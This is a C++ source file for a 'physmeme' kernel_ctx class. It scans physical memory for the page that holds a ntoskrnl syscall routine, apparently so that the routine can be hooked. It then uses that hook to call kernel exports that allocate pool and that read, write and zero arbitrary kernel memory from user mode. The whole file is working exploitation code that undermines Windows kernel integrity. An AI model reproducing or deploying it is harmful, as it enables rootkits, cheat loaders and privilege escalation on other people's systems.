#include "kernel_ctx.h"

namespace physmeme
{
	kernel_ctx::kernel_ctx()
	{
		if (psyscall_func.load() || nt_page_offset || ntoskrnl_buffer)
			return;

		nt_rva = reinterpret_cast<std::uint32_t>(
			util::get_module_export(
				"ntoskrnl.exe",
				syscall_hook.first.data(),
				true
			));

		nt_page_offset = nt_rva % page_size;
		ntoskrnl_buffer = reinterpret_cast<std::uint8_t*>(
			LoadLibraryA(ntoskrnl_path)
		);

		std::vector<std::thread> search_threads;
		//--- for each physical memory range, make a thread to search it
		for (auto ranges : util::pmem_ranges)
			search_threads.emplace_back(std::thread(
				&kernel_ctx::map_syscall,
				this,
				ranges.first,
				ranges.second
			));

		for (std::thread& search_thread : search_threads)
			search_thread.join();
	}

	void kernel_ctx::map_syscall(std::uintptr_t begin, std::uintptr_t end) const
	{
		//if the physical memory range is less then or equal to 2mb
		if (begin + end <= 0x1000 * 512)
		{
			auto page_va = physmeme::map_phys(begin + nt_page_offset, end);
			if (page_va)
			{
				// scan every page of the physical memory range
				for (auto page = page_va; page < page_va + end; page += 0x1000)
					if (!psyscall_func.load()) // keep scanning until its found
						if (!memcmp(reinterpret_cast<void*>(page), ntoskrnl_buffer + nt_rva, 32))
						{
							psyscall_func.store((void*)page);
							return;
						}
				physmeme::unmap_phys(page_va, end);
			}
		}
		else // else the range is bigger then 2mb
		{
			auto remainder = (begin + end) % (0x1000 * 512);

			// loop over 2m chunks
			for (auto range = begin; range < begin + end; range += 0x1000 * 512)
			{
				auto page_va = physmeme::map_phys(range + nt_page_offset, 0x1000 * 512);
				if (page_va)
				{
					// loop every page of 2mbs (512)
					for (auto page = page_va; page < page_va + 0x1000 * 512; page += 0x1000)
					{
						if (!memcmp(reinterpret_cast<void*>(page), ntoskrnl_buffer + nt_rva, 32))
						{
							psyscall_func.store((void*)page);
							return;
						}
					}
					physmeme::unmap_phys(page_va, 0x1000 * 512);
				}
			}

			// map the remainder and check each page of it
			auto page_va = physmeme::map_phys(begin + end - remainder + nt_page_offset, remainder);
			if (page_va)
			{
				for (auto page = page_va; page < page_va + remainder; page += 0x1000)
				{
					if (!memcmp(reinterpret_cast<void*>(page), ntoskrnl_buffer + nt_rva, 32))
					{
						psyscall_func.store((void*)page);
						return;
					}
				}
				physmeme::unmap_phys(page_va, remainder);
			}
		}
	}

	void* kernel_ctx::allocate_pool(std::size_t size, POOL_TYPE pool_type)
	{
		static const auto ex_alloc_pool = 
			util::get_module_export(
				"ntoskrnl.exe", 
				"ExAllocatePool"
			);

		return syscall<ExAllocatePool>(
			ex_alloc_pool, 
			pool_type,
			size
		);
	}

	void* kernel_ctx::allocate_pool(std::size_t size, ULONG pool_tag, POOL_TYPE pool_type)
	{
		static const auto ex_alloc_pool_with_tag = 
			util::get_module_export(
				"ntoskrnl.exe", 
				"ExAllocatePoolWithTag"
			);

		return syscall<ExAllocatePoolWithTag>(
			ex_alloc_pool_with_tag,
			pool_type,
			size,
			pool_tag
		);
	}

	void kernel_ctx::read_kernel(void* addr, void* buffer, std::size_t size)
	{
		static const auto mm_copy_memory = 
			util::get_module_export(
				"ntoskrnl.exe", 
				"RtlCopyMemory"
			);

		syscall<decltype(&memcpy)>(
			mm_copy_memory,
			buffer,
			addr,
			size
		);
	}

	void kernel_ctx::write_kernel(void* addr, void* buffer, std::size_t size)
	{
		static const auto mm_copy_memory = 
			util::get_module_export(
				"ntoskrnl.exe",
				"RtlCopyMemory"
			);

		syscall<decltype(&memcpy)>(
			mm_copy_memory,
			addr,
			buffer,
			size
		);
	}

	void kernel_ctx::zero_kernel_memory(void* addr, std::size_t size)
	{
		static const auto rtl_zero_memory = 
			util::get_module_export(
				"ntoskrnl.exe",
				"RtlZeroMemory"
			);

		syscall<decltype(&RtlSecureZeroMemory)>(
			rtl_zero_memory, 
			addr,
			size
		);
	}
}